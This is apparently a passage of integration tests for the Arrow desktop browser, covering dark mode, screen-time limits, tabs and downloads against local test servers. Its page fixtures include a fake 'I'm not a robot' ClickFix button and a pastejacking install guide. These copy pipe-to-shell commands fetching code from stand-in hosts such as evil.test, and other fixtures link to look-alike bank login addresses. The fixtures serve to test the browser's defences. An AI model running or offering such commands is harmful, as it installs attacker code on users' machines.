#!/usr/bin/env python3
"""Integration tests that drive the real browser window (needs a display).
They use a throw-away HOME and local HTTP servers, never the network or your profile.
Run: python3 -m unittest discover -s tests -v"""
import http.server
import importlib.util
import json
import os
import shutil
import socket
import ssl
import subprocess
import tempfile
import threading
import time
import unittest
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

# Must be set before the browser module computes its config paths at import time.
_HOME = tempfile.mkdtemp(prefix="arrow-test-home-")
os.environ["HOME"] = _HOME

ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
spec = importlib.util.spec_from_file_location("bb_window", os.path.join(ROOT, "arrow_browser.py"))
bb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bb)
from gi.repository import Gdk, Gio, GLib, Gtk, WebKit2  # noqa: E402

HAVE_DISPLAY = Gtk.init_check()[0] if isinstance(Gtk.init_check(), tuple) else bool(Gtk.init_check())

def _closed_port():
    """A local port nothing listens on (WebKit refuses to even try low ones such as 1)."""
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


DEAD_PORT = _closed_port()

ARTICLE = ("<html><head><title>Test Article</title><meta name='author' content='A. Writer'></head><body>"
           "<nav><a href='/'>Home</a> <a href='/menu'>Menu</a></nav><div class='content'><h1>The Great Test</h1>"
           + "".join(f"<p>Paragraph {i}: the quick brown fox jumps over the lazy dog while the test "
                     f"checks that a long article page loads and keeps its text.</p>" for i in range(6))
           + "<div class='share'><a href='/s'>Share this</a></div></div><footer>Copyright</footer></body></html>")
PAGES = {
    "/blank": "<html><title>blank</title></html>",
    "/article": ARTICLE,
    "/thin": "<html><title>thin</title><body><p>short</p></body></html>",
    "/pinglink": "<html><title>pinglink</title><body><a id='l' href='/thin' ping='/pinged'>go</a>"
                 "<iframe id='f' src='/blank'></iframe></body></html>",
    "/login": ("<html><title>login</title><body><form action='/done' method='get'>"
               "<input id='u' type='text' name='user'><input id='p' type='password' name='pw'>"
               "<button id='go' type='submit'>Sign in</button></form></body></html>"),
    "/done": "<html><title>done</title><body>ok</body></html>",
    "/js": "<html><head><title>js-off</title></head><body><script>document.title='js-ran'</script></body></html>",
    "/pathrules": ("<html><title>pathrules</title><body><img src='/pagead/p.png'><img src='/sub/ads/p.png'>"
                   "<img src='/telemetry.png'><img src='/pagead/stream.m3u8'><img src='/roads/ok.png'><img src='/adsense.png'>"
                   "<img src='/fine/ok.png'></body></html>"),
    "/ads/landing": "<html><title>landing</title><body>an ordinary page whose address contains /ads/</body></html>",
    "/mem-heavy": ("<html><title>mem-heavy</title><body><script>window.keep=[];for(let i=0;i<20;i++){"
                   "let a=new Float64Array(1000000);a.fill(i+1);window.keep.push(a)}</script>heavy</body></html>"),
    # a page that keeps its renderer busy nearly all the time, like a heavy animation
    "/busy": ("<html><title>busy</title><body><script>setInterval(()=>{let e=performance.now()+48;"
              "while(performance.now()<e){}},50)</script></body></html>"),
    "/form": "<html><title>form</title><body><textarea id='t'></textarea></body></html>",
    "/third": "<html><title>third</title><body><img src='http://localhost:%PORT%/pixel'></body></html>",
    # a single-page site (like YouTube): moves to another address without loading a new page
    "/spa": ("<html><title>spa</title><body><script>window.go=n=>history.pushState({},'','/spa/watch?v='+n)"
             "</script></body></html>"),
    "/framed": "<html><title>framed</title><body><iframe src='/thin?utm_source=frame'></iframe></body></html>",
    "/darksite": ("<html><head><title>darksite</title><style>.dk{background:#121212;color:#eee}</style></head>"
                  "<body class='dk'>already dark</body></html>"),
    # what broke mouse-wheel scrolling on mindrift.ai: no bounce at the page's ends plus a wheel listener
    "/nobounce": ("<html><head><title>nobounce</title><style>html{overscroll-behavior:none}</style></head><body>"
                  + "<p>line</p>" * 300 + "<script>addEventListener('wheel',()=>{},{passive:false})</script></body></html>"),
    "/opener": "<html><title>opener</title><body><a id='p' target='_blank' href='/done?utm_source=mail&k=1'>open</a></body></html>",
    # like google.com/url: a page whose script sends you on to a site that can't be reached
    "/jsredirect-dead": ("<html><title>jsredirect</title><body><script>"
                         f"location.replace('http://127.0.0.1:{DEAD_PORT}/gone')</script></body></html>"),
    "/winopener": ("<html><title>winopener</title><body><a id='p' target='_blank' rel='opener' "
                   "href='http://localhost:%PORT%/blank'>open</a></body></html>"),
    # its dark theme arrives late, while an image that takes ages keeps the page from finishing
    "/latedark": ("<html><head><title>latedark</title><link rel='stylesheet' href='/latedark.css'></head>"
                  "<body><p>dark once its stylesheet is in</p><img src='/slow.png'></body></html>"),
    "/popups": ("<html><title>popups</title><body><a id='link' target='_blank' href='http://localhost:%PORT%/thin'>x</a>"
                "<a id='ad' target='_blank' href='http://127.0.0.2:%PORT%/blank'>ad</a>"
                "<button id='open' onclick='window.res = String(window.open(window.to))'>open</button></body></html>"),
    "/darkbanner": ("<html><title>darkbanner</title><body>"
                    "<div id='banner' style='background:url(data:image/gif;base64,R0lGODlhAQABAAAAACw=) no-repeat'>"
                    "<h1 id='heading'>Buy cars</h1><img id='inside' alt='' width='4' height='4'"
                    " style='background:url(data:image/gif;base64,R0lGODlhAQABAAAAACw=)'></div>"
                    "<img id='alone' alt='' width='4' height='4'></body></html>"),
    "/darkvideo": ("<html><title>darkvideo</title><body>"
                   "<iframe id='yt' src='about:blank#https://www.youtube-nocookie.com/embed/x'></iframe>"
                   "<iframe id='player' src='about:blank#/video-player/1'></iframe>"
                   "<iframe id='comments' src='about:blank#/comments'></iframe></body></html>"),
    "/hiding": ("<html><title>hiding</title><body><div id='ad' class='arrow-test-ad'>ad</div>"
                "<div id='ck' class='arrow-test-cookie'>cookies</div><div id='site' class='arrow-site-only'>site</div>"
                "<p id='ok'>text</p></body></html>"),
    "/menu": ("<html><title>menu</title><body><p><a id='link' href='/done?utm_source=mail&amp;k=1'>a link</a></p>"
              "<p><span id='words'>hello   world</span></p></body></html>"),
    # a fake "I'm not a robot" page (ClickFix): its button copies a command to paste into a Terminal
    "/clickfix": ("<html><title>clickfix</title><body><button id='b' style='width:300px;height:80px' onclick=\""
                  "navigator.clipboard.writeText('curl -s http://x.test/v | bash # I am not a robot - Verification ID 1')"
                  "\">Verify</button></body></html>"),
    # an install guide; with window.jack set, its copy handler swaps what the user copies (pastejacking)
    "/install-guide": ("<html><title>install-guide</title><body><pre id='cmd'>curl -fsSL https://get.example.test | sh</pre>"
                       "<script>document.addEventListener('copy', e => { if (window.jack) { e.clipboardData.setData("
                       "'text/plain', 'wget -qO- http://evil.test/x | sh'); e.preventDefault(); } })</script></body></html>"),
    # a YouTube-like watch page (the test maps it to https://www.youtube.com/watch?v=...)
    "/watch": ("<html><title>watch</title><body><div class='html5-video-player'><video id='v' src='/sb.webm' muted "
               "autoplay width=160 height=90></video></div></body></html>"),
    # links a page opens itself: to a look-alike bank address, and plain http:// to a site with no HTTPS
    "/clicklinks": ("<html><title>clicklinks</title><body><a id='fake' href='https://hdfc-netbanking.invalid/login'>"
                    "bank</a> <a id='plain' href='http://arrow-https-test.invalid/page'>plain</a></body></html>"),
    # a hidden frame whose file can't be shown and isn't sent as a download
    "/blobframe": "<html><title>blobframe</title><body><iframe style='display:none' src='/blob.bin'></iframe></body></html>",
    "/dlframes": "<html><title>dlframes</title><body>" + "".join(
        f"<iframe style='display:none' src='/dl?n={i}'></iframe>" for i in range(5)) + "</body></html>",
}


BIG_FILE = bytes(range(256)) * 4096  # 1 MiB with a pattern, so a misplaced byte shows

class Handler(http.server.BaseHTTPRequestHandler):
    video = b""  # made by make_test_video() when a test needs it
    hits = {}
    requests = []  # full paths, query included
    download_requests = []  # (path, Range header, Cookie header) for /big.dat and /norange.dat
    download_delay = 0.01

    def do_GET(self):
        path = self.path.split("?")[0]
        Handler.hits[path] = Handler.hits.get(path, 0) + 1
        Handler.requests.append(self.path)
        if path == "/dl":  # the real name only comes in Content-Disposition
            body = b"%PDF-1.4 test"
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="Report 2026.pdf"')
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path in ("/big.dat", "/norange.dat"):  # a slow download; /big.dat can send just a part (Range)
            Handler.download_requests.append((path, self.headers.get("Range"), self.headers.get("Cookie")))
            body, start = BIG_FILE, 0
            wanted = self.headers.get("Range") if path == "/big.dat" else None
            if wanted and wanted.startswith("bytes=") and wanted.endswith("-"):
                start = int(wanted[6:-1])
                if start >= len(body):
                    self.send_response(416)
                    self.send_header("Content-Range", f"bytes */{len(body)}")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                self.send_response(206)
                self.send_header("Content-Range", f"bytes {start}-{len(body) - 1}/{len(body)}")
            else:
                self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", f'attachment; filename="{path[1:]}"')
            self.send_header("Accept-Ranges", "bytes" if path == "/big.dat" else "none")
            self.send_header("ETag", '"v1"')
            self.send_header("Content-Length", str(len(body) - start))
            self.end_headers()
            try:
                for i in range(start, len(body), 8192):
                    self.wfile.write(body[i:i + 8192])
                    self.wfile.flush()
                    time.sleep(Handler.download_delay)
            except (BrokenPipeError, ConnectionResetError):
                pass  # the browser stopped (paused or cancelled)
            return
        if path in ("/latedark.css", "/slow.png"):
            time.sleep(2.0 if path == "/latedark.css" else 6.0)
            body = b"body { background: #121212; color: #eee }" if path.endswith(".css") else b"\x89PNG"
            self.send_response(200)
            self.send_header("Content-Type", "text/css" if path.endswith(".css") else "image/png")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/broken.zip":  # promises more than it sends, then hangs up
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Length", "100000")
            self.end_headers()
            self.wfile.write(b"PK" * 5)
            self.wfile.flush()
            self.close_connection = True
            return
        if path == "/sb.webm":  # the test video, with byte ranges so the player can jump
            body, start = Handler.video, 0
            wanted = self.headers.get("Range")
            if wanted and wanted.startswith("bytes="):
                start = int(wanted[6:].split("-")[0])
                self.send_response(206)
                self.send_header("Content-Range", f"bytes {start}-{len(body) - 1}/{len(body)}")
            else:
                self.send_response(200)
            self.send_header("Content-Type", "video/webm")
            self.send_header("Accept-Ranges", "bytes")
            self.send_header("Content-Length", str(len(body) - start))
            self.end_headers()
            try:
                self.wfile.write(body[start:])
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
        if path.startswith("/sb-api/"):  # stands in for sponsor.ajay.app/api/skipSegments/
            if path == "/sb-api/" + bb.sponsorblock_prefix("dQw4w9WgXcQ"):
                body = json.dumps([{"videoID": "dQw4w9WgXcQ", "segments": [
                    {"category": "sponsor", "actionType": "skip", "segment": [2, 14]}]},
                    {"videoID": "zzzzzzzzzzz", "segments": []}]).encode()
                self.send_response(200)
            else:
                body = b"Not Found"
                self.send_response(404)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/blob.bin":
            body = b"\x00not a page"
            self.send_response(200)
            self.send_header("Content-Type", "application/x-arrow-test")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/to-fake-bank":  # a short link that leads to a copy of a bank's address
            self.send_response(302)
            self.send_header("Location", "http://sbi-kyc-update.invalid/login")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        if path.endswith(".desktop"):
            body = b"[Desktop Entry]\nType=Application\nExec=true\n"
            self.send_response(200)
            self.send_header("Content-Type", "application/x-desktop")
            self.send_header("Content-Disposition", "attachment")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/pixel" or path.endswith(".png"):
            body, ctype = b"\x89PNG", "image/png"
        else:
            body = PAGES.get(path, "<html><title>404</title></html>").replace("%PORT%", str(self.server.server_port)).encode()
            ctype = "text/html"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def _record_post(self):  # <a ping> reports arrive as POSTs
    Handler.requests.append("POST " + self.path)
    self.send_response(204)
    self.end_headers()


Handler.do_POST = _record_post


class TLSServer(http.server.ThreadingHTTPServer):
    """HTTPS test server. The TLS handshake runs in each connection's own thread: done in the accept loop,
    one connection that never finishes its handshake would stall every other one."""
    tls = None

    def finish_request(self, request, client_address):
        try:
            request = self.tls.wrap_socket(request, server_side=True)
        except (ssl.SSLError, OSError):
            return  # the browser rejected the certificate
        super().finish_request(request, client_address)


def make_test_video(seconds=30):
    """A small silent WebM (160x90, VP8) made with GStreamer, or None when it can't be made here."""
    try:
        import gi
        gi.require_version("Gst", "1.0")
        from gi.repository import Gst
        Gst.init(None)
    except (ImportError, ValueError):
        return None
    path = os.path.join(_HOME, "test-video.webm")
    try:
        pipeline = Gst.parse_launch(
            f"videotestsrc num-buffers={seconds * 10} pattern=ball ! video/x-raw,width=160,height=90,framerate=10/1 ! "
            f"vp8enc deadline=1 cpu-used=8 keyframe-max-dist=10 ! webmmux ! filesink location={path}")
    except GLib.Error:
        return None
    pipeline.set_state(Gst.State.PLAYING)
    pipeline.get_bus().timed_pop_filtered(60 * Gst.SECOND, Gst.MessageType.EOS | Gst.MessageType.ERROR)
    pipeline.set_state(Gst.State.NULL)
    with open(path, "rb") as f:
        return f.read() or None


def spin(condition, timeout=10.0):
    end = time.time() + timeout
    while time.time() < end:
        while Gtk.events_pending():
            Gtk.main_iteration_do(False)
        if condition():
            return True
        time.sleep(0.02)
    return condition()


def js(webview, script, timeout=5.0):
    box = {}

    def done(wv, result, _):
        try:
            box["v"] = wv.run_javascript_finish(result).get_js_value().to_string()
        except Exception as e:
            box["v"] = f"ERR {e}"

    webview.run_javascript(script, None, done, None)
    spin(lambda: "v" in box, timeout)
    return box.get("v")


class FakeSecrets:
    def __init__(self):
        self.items = {}
        self.error = ""

    def available(self):
        return True

    def store(self, host, user, password):
        self.items[(host, user)] = password
        return True

    def find(self, host=None):
        return [{"item": f"{h}|{u}", "host": h, "username": u} for (h, u) in sorted(self.items) if host in (None, h)]

    def get_password(self, item):
        h, u = item.split("|")
        return self.items.get((h, u))

    def delete(self, item):
        h, u = item.split("|")
        return self.items.pop((h, u), None) is not None


@unittest.skipUnless(HAVE_DISPLAY and os.environ.get("DISPLAY"), "needs a display")
class WindowFeatureTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        cls.port = cls.server.server_port
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.port}"
        # HTTPS with a self-signed certificate, which no system trusts
        cls.cert_file, key_file = os.path.join(_HOME, "test-cert.pem"), os.path.join(_HOME, "test-key.pem")
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "30",
                        "-keyout", key_file, "-out", cls.cert_file,
                        "-subj", "/O=Arrow Test Issuer/CN=arrow-test.example",
                        "-addext", "subjectAltName=IP:127.0.0.1,IP:127.0.0.2"], check=True, capture_output=True)
        TLSServer.tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        TLSServer.tls.load_cert_chain(cls.cert_file, key_file)
        cls.tls_servers = {}
        for address in ("127.0.0.1", "127.0.0.2"):
            server = TLSServer((address, 0), Handler)
            threading.Thread(target=server.serve_forever, daemon=True).start()
            cls.tls_servers[address] = server
        os.makedirs(bb.CONFIG_DIR, exist_ok=True)
        with open(bb.CONFIG_FILE, "w") as f:
            json.dump({"homepage": cls.base + "/blank", "open_homepage_on_startup": True,
                       "first_run_greeted": True, "tracker_lists_enabled": True}, f)
        # a tracker "list" that blocks third-party loads from the name `localhost`
        os.makedirs(bb.CACHE_DIR, exist_ok=True)
        with open(bb.TRACKER_LIST_CACHE, "w") as f:
            json.dump({"fetched": time.time(), "domains": ["localhost"]}, f)
        bb.ArrowBrowserWindow._maybe_refresh_tracker_list = lambda self: False
        bb.ArrowBrowserWindow.start_auto_git_update_check = lambda self: False
        # never put test notifications on the real desktop
        cls.notifications = []
        bb.DESKTOP_NOTIFIER.send = lambda summary, body="", icon="", on_click=None: \
            cls.notifications.append((summary, body, on_click))
        cls.win = bb.ArrowBrowserWindow()
        cls.started_hiding_cookie_banners = cls.win.hide_cookie_banners
        cls.win.show_all()
        cls.win.secrets = FakeSecrets()
        assert spin(lambda: cls.win.content_filter is not None, 20), "content filter never compiled"

    @classmethod
    def tearDownClass(cls):
        cls.win.destroy()
        cls.server.shutdown()
        for server in cls.tls_servers.values():
            server.shutdown()
        shutil.rmtree(_HOME, ignore_errors=True)

    def setUp(self):
        self.win.site_settings.clear()
        self.win._clear_infobar()
        Handler.hits.clear()
        Handler.requests.clear()

    def load(self, path, wait_title=None):
        wv = self.win.get_active_webview()
        wv.load_uri(self.base + path)
        self.assertTrue(spin(lambda: not wv.is_loading() and (wv.get_uri() or "").endswith(path.split("?")[0])
                             and (wait_title is None or wv.get_title() == wait_title), 10), f"{path} did not load")
        return wv

    # ---- dark mode -----------------------------------------------------
    def test_dark_mode_darkens_light_pages_and_leaves_dark_ones_alone(self):
        win = self.win
        filtered = "getComputedStyle(document.documentElement).filter !== 'none'"
        self.assertFalse(win.dark_mode_active)
        self.assertFalse(hasattr(win, "btn_dark"), "dark mode lives in Settings, not on the toolbar")
        try:
            wv = self.load("/darksite", "darksite")
            win.set_dark_mode(True)  # switched on while a dark page is showing
            self.assertTrue(spin(lambda: js(wv, filtered) == "false", 3), "already-dark page was inverted (turns white)")
            self.load("/thin", "thin")
            self.assertTrue(spin(lambda: js(wv, filtered) == "true", 3), "light page not darkened")
            js(wv, "document.body.style.background = '#121212'")  # the site switches to its own dark theme
            self.assertTrue(spin(lambda: js(wv, filtered) == "false", 3), "page that turned dark still inverted")
            self.load("/darksite", "darksite")
            self.assertTrue(spin(lambda: js(wv, filtered) == "false", 3), "newly loaded dark page was inverted")
            dark_bg = Gdk.RGBA()
            dark_bg.parse("#1a1a1a")
            self.assertEqual(wv.get_background_color().to_string(), dark_bg.to_string(), "view shows white before a page paints")
        finally:
            win.set_dark_mode(False)
        self.assertEqual(wv.get_background_color().to_string(), "rgb(255,255,255)")

    def test_dark_mode_turns_back_background_pictures_but_not_the_text_on_them(self):
        # cardekho.com sets its banner photo with the "background:url(...)" shorthand; only
        # "background-image" was turned back, so the photo showed inverted.
        win = self.win
        win.set_dark_mode(True)
        self.addCleanup(win.set_dark_mode, False)
        wv = self.load("/darkbanner", "darkbanner")
        filters = "JSON.stringify(['banner', 'heading', 'inside', 'alone'].map(id => getComputedStyle(document.getElementById(id)).filter))"
        self.assertTrue(spin(lambda: "invert" in (js(wv, filters) or ""), 3))
        banner, heading, inside, alone = json.loads(js(wv, filters))
        self.assertIn("invert(1)", banner, "background picture turned back")
        self.assertIn("invert(0.9)", heading, "the text on it darkened again")
        self.assertEqual(inside, "none", "a picture inside it is already right")
        self.assertIn("invert(1)", alone)

    def test_dark_mode_turns_back_embedded_video_players(self):
        # A YouTube or news-site player is an iframe; the page's invert reached it and nothing turned
        # it back, so embedded videos showed inverted (seen on moneycontrol.com).
        win = self.win
        win.set_dark_mode(True)
        self.addCleanup(win.set_dark_mode, False)
        wv = self.load("/darkvideo", "darkvideo")
        filters = "JSON.stringify(['yt', 'player', 'comments'].map(id => getComputedStyle(document.getElementById(id)).filter))"
        self.assertTrue(spin(lambda: "invert" in (js(wv, filters) or ""), 3))
        yt, player, comments = json.loads(js(wv, filters))
        self.assertIn("invert(1)", yt, "YouTube embed turned back")
        self.assertIn("invert(1)", player, "a site's own video player turned back")
        self.assertEqual(comments, "none", "other iframes stay darkened with the page")

    def test_dark_mode_notices_a_dark_theme_that_arrives_while_loading(self):
        # Heavy sites paint long before they finish loading and their dark styles come in between.
        # Until a check noticed, the dark page stayed inverted, i.e. white (seen on ndtv.com, github.com).
        win = self.win
        win.set_dark_mode(True)
        self.addCleanup(win.set_dark_mode, False)
        wv = win.get_active_webview()
        wv.load_uri(self.base + "/latedark")
        native = "document.documentElement.hasAttribute('%s')" % bb.DARK_NATIVE_ATTR
        body_dark = "getComputedStyle(document.body).backgroundColor === 'rgb(18, 18, 18)'"
        self.assertTrue(spin(lambda: js(wv, "document.body && " + body_dark) == "true", 8), "stylesheet never arrived")
        self.assertTrue(spin(lambda: js(wv, native) == "true", 0.5), "dark page kept inverted (white) while loading")
        self.assertTrue(wv.is_loading(), "the page finished loading too soon to show the bug")
        wv.stop_loading()

    # ---- digital wellbeing ---------------------------------------------
    def wellbeing_on(self):
        win, tracker = self.win, bb.wellbeing_tracker()
        win.wellbeing_enabled = True
        win._clear_infobar()

        def reset():
            win.wellbeing_enabled = win.bedtime_enabled = False
            win._update_bedtime(time.time())
            win.set_dark_mode(False)
            win._clear_infobar()
            tracker.limits.clear()
            tracker.clear()
            tracker.tokens.clear()
            tracker.bedtime_snoozed = tracker.bedtime_greeted = ""
            tracker.last_active = tracker.next_break = None
        self.addCleanup(reset)
        return win, tracker

    def infobar_text(self):
        bar = self.win._infobar
        return bar.get_content_area().get_children()[0].get_text() if bar else ""

    def test_screen_time_counts_only_the_site_in_front_and_limits_close_it(self):
        win, tracker = self.wellbeing_on()
        wv, site = self.load("/thin", "thin"), "127.0.0.1"
        now = time.time()
        win._wellbeing_step(now, time.monotonic(), False)
        self.assertEqual(tracker.used(site, now), 0, "not counted while another window is in front")
        win._wellbeing_step(now, time.monotonic(), True)
        self.assertEqual(tracker.used(site, now), win.WELLBEING_TICK_SECONDS)

        tracker.set_limit(site, 1)
        tracker.add(site, 60, now)
        win._wellbeing_step(now, time.monotonic(), False)  # limits apply even when not in front
        self.assertTrue(spin(lambda: (wv.get_uri() or "").startswith("arrow://times-up"), 5), wv.get_uri())
        self.assertTrue(spin(lambda: js(wv, "document.querySelector('h1').innerText") == "Time's up for 127.0.0.1", 5))

        wv.load_uri(self.base + "/done")  # the site stays closed for the rest of the day
        self.assertTrue(spin(lambda: (wv.get_uri() or "").startswith("arrow://times-up"), 5), wv.get_uri())
        allowed = tracker.allowed(site)
        wv.load_uri("arrow://wellbeing-more?t=made-up")  # a page can't hand itself more time
        self.assertTrue(spin(lambda: not wv.is_loading(), 5))
        self.assertEqual(tracker.allowed(site), allowed)

        wv.load_uri(self.base + "/done")
        self.assertTrue(spin(lambda: (wv.get_uri() or "").startswith("arrow://times-up"), 5))
        self.assertTrue(spin(lambda: js(wv, "document.querySelector('a.btn') !== null") == "true", 5))
        more = js(wv, "document.querySelector('a.btn').href")
        js(wv, "document.querySelector('a.btn').click()")
        self.assertTrue(spin(lambda: wv.get_uri() == self.base + "/done" and wv.get_title() == "done", 10),
                        "5 more minutes goes back to the page")
        self.assertEqual(tracker.allowed(site), allowed + bb.WELLBEING_EXTRA_SECONDS)
        wv.load_uri(more)
        self.assertTrue(spin(lambda: wv.get_uri() == more and not wv.is_loading(), 5))
        self.assertEqual(tracker.allowed(site), allowed + bb.WELLBEING_EXTRA_SECONDS, "each button works once")

    def test_break_reminder_and_snooze(self):
        win, tracker = self.wellbeing_on()
        self.load("/thin", "thin")
        now = time.monotonic()
        win._wellbeing_step(time.time(), now, True)
        win._wellbeing_step(time.time(), now + 5, True)
        self.assertIsNone(win._infobar)
        tracker.next_break = now + 6
        win._wellbeing_step(time.time(), now + 10, True)
        self.assertIn(f"browsing for {win.break_interval_minutes} minutes", self.infobar_text())
        win._infobar.response(1)  # Snooze 10 min
        self.assertIsNone(win._infobar)
        self.assertGreater(tracker.next_break, time.monotonic() + win.BREAK_SNOOZE_SECONDS - 5)

    def test_bedtime_turns_pages_grey_also_with_dark_mode(self):
        win, tracker = self.wellbeing_on()
        filt = "getComputedStyle(document.documentElement).filter"
        wv = self.load("/thin", "thin")
        win.bedtime_enabled = True
        win.bedtime_start = time.strftime("%H:%M", time.localtime(time.time() - 3600))
        win.bedtime_end = time.strftime("%H:%M", time.localtime(time.time() + 3600))
        win._update_bedtime(time.time())
        self.assertTrue(spin(lambda: "grayscale" in js(wv, filt), 3), js(wv, filt))
        self.assertIn("bedtime", self.infobar_text())

        win.set_dark_mode(True)
        self.assertTrue(spin(lambda: "invert" in js(wv, filt) and "grayscale" in js(wv, filt), 3), js(wv, filt))
        win.set_dark_mode(False)
        self.assertTrue(spin(lambda: "grayscale" in js(wv, filt) and "invert" not in js(wv, filt), 3), js(wv, filt))

        before = len(win._tab_boxes())
        self.addCleanup(lambda: [win.close_tab(t) for t in win._tab_boxes()[before:]])
        win.create_new_tab(self.base + "/blank")
        new = win.get_active_webview()
        self.assertTrue(spin(lambda: not new.is_loading() and "grayscale" in js(new, filt), 5), "new tabs are grey too")

        win._infobar.response(1)  # Not tonight
        self.assertTrue(spin(lambda: js(new, filt) == "none", 3), js(new, filt))
        win._update_bedtime(time.time())
        self.assertFalse(win._bedtime_active, "stays off for the rest of the night")

    def test_settings_adds_and_removes_a_site_limit(self):
        win, tracker = self.wellbeing_on()
        dialog = win.build_settings_dialog("wellbeing")
        self.addCleanup(dialog.destroy)
        controls = dialog._arrow_controls
        controls["wellbeing_limit_site"].set_text("not a site")
        controls["wellbeing_limit_add"].clicked()
        self.assertEqual(tracker.limits, {})
        controls["wellbeing_limit_site"].set_text("https://www.Example.co.uk/page")
        controls["wellbeing_limit_minutes"].set_value(45)
        controls["wellbeing_limit_add"].clicked()
        self.assertEqual(tracker.limits, {"example.co.uk": 45})
        with open(bb.WELLBEING_FILE) as f:
            self.assertEqual(json.load(f)["limits"], {"example.co.uk": 45}, "saved to disk")

        def buttons(widget):
            if isinstance(widget, Gtk.Button):
                yield widget
            if isinstance(widget, Gtk.Container):
                for child in widget.get_children():
                    yield from buttons(child)
        remove = [b for b in buttons(controls["wellbeing_limits_box"]) if b.get_label() == "Remove"]
        self.assertEqual(len(remove), 1)
        remove[0].clicked()
        self.assertEqual(tracker.limits, {})

        controls["wellbeing_enabled"].set_active(False)
        self.assertFalse(win.wellbeing_enabled)

    # ---- tabs ----------------------------------------------------------
    def test_switching_tabs_shows_that_tabs_address_and_title(self):
        win = self.win
        win.create_new_tab(self.base + "/blank")
        win.create_new_tab(self.base + "/thin")
        tabs = [win.notebook.get_nth_page(i) for i in range(win.notebook.get_n_pages())]
        self.assertTrue(spin(lambda: all(not t._arrow_webview.is_loading() and t._arrow_webview.get_title()
                                         for t in tabs[-2:]), 10))
        try:
            for tab in tabs[-2:] + tabs[-2:]:
                win.notebook.set_current_page(win.notebook.page_num(tab))
                wv = tab._arrow_webview
                self.assertEqual(win.url_entry.get_text(), wv.get_uri(), "address bar shows the tab clicked")
                self.assertTrue(win.get_title().startswith(wv.get_title() + " - "), "window title too")
                self.assertEqual(win.get_title(), wv.get_title() + " - Arrow Browser", "no version number in the title bar")
        finally:
            for tab in tabs[-2:]:
                win.close_tab(tab)

    def test_link_opens_new_tab_quickly_with_gpu_off(self):
        # WebKitGTK 2.52 stalls a new tab opened by a page for 15 s under HardwareAccelerationPolicy.NEVER,
        # and the opener stops painting meanwhile.
        win = self.win
        saved = win.gpu_acceleration_enabled
        win.gpu_acceleration_enabled = False
        win._apply_hardware_acceleration_policy()
        before = win.notebook.get_n_pages()
        win.create_new_tab(self.base + "/blank")
        try:
            opener = win.get_active_webview()
            opener.load_uri(self.base + "/opener")
            self.assertTrue(spin(lambda: opener.get_title() == "opener" and not opener.is_loading(), 10))
            opener.run_javascript("document.getElementById('p').click()", None, None, None)
            self.assertTrue(spin(lambda: win.notebook.get_n_pages() == before + 2, 3), "no new tab")
            popup = win.notebook.get_nth_page(win.notebook.get_n_pages() - 1)._arrow_webview
            started = time.time()
            self.assertTrue(spin(lambda: popup.get_title() == "done", 10), "new tab never loaded")
            self.assertLess(time.time() - started, 5, "new tab stalled")
            answered = []
            for wv in (opener, popup):
                wv.run_javascript("1+1", None, lambda v, r, _d: answered.append(v), None)
            self.assertTrue(spin(lambda: len(answered) == 2, 3), "a tab stopped responding")
            if not bb._DRIVER_UNSTABLE:
                self.assertEqual(popup.get_settings().get_hardware_acceleration_policy(),
                                 WebKit2.HardwareAccelerationPolicy.ALWAYS)
                self.assertEqual(opener.get_settings().get_hardware_acceleration_policy(),
                                 WebKit2.HardwareAccelerationPolicy.NEVER, "only the new tab is lifted")
        finally:
            for i in reversed(range(before, win.notebook.get_n_pages())):
                win.close_tab(win.notebook.get_nth_page(i))
            win.gpu_acceleration_enabled = saved
            win._apply_hardware_acceleration_policy()

    def test_pin_reorder_close_reopen_and_session(self):
        win = self.win
        win.create_new_tab(self.base + "/blank")
        win.create_new_tab(self.base + "/done")
        spin(lambda: all(not win.notebook.get_nth_page(i)._arrow_webview.is_loading() for i in range(win.notebook.get_n_pages())))
        last = win.notebook.get_nth_page(win.notebook.get_n_pages() - 1)
        win.set_tab_pinned(last, True)
        self.assertEqual(win.notebook.page_num(last), 0, "pinned tab moves to the front")
        self.assertFalse(last._arrow_close_btn.get_visible())
        self.assertTrue(last._arrow_label.get_text().startswith("📌"))
        urls, pinned = win._collect_session()
        self.assertEqual(pinned, [0])
        win._run_session_save()
        with open(bb.SESSION_FILE) as f:
            self.assertEqual(json.load(f)["pinned"], [0])

        win.close_other_tabs(win.notebook.get_nth_page(1))
        self.assertEqual(win.notebook.get_n_pages(), 2, "close-others keeps the chosen tab and pinned tabs")
        self.assertTrue(win._closed_tabs)
        before = win.notebook.get_n_pages()
        win.reopen_closed_tab()
        self.assertEqual(win.notebook.get_n_pages(), before + 1)
        win.set_tab_pinned(last, False)
        self.assertTrue(last._arrow_close_btn.get_visible())

        ev = Gdk.EventButton()  # what the "button-press-event" signal really passes to handlers
        ev.type = Gdk.EventType.BUTTON_PRESS
        ev.button = 2
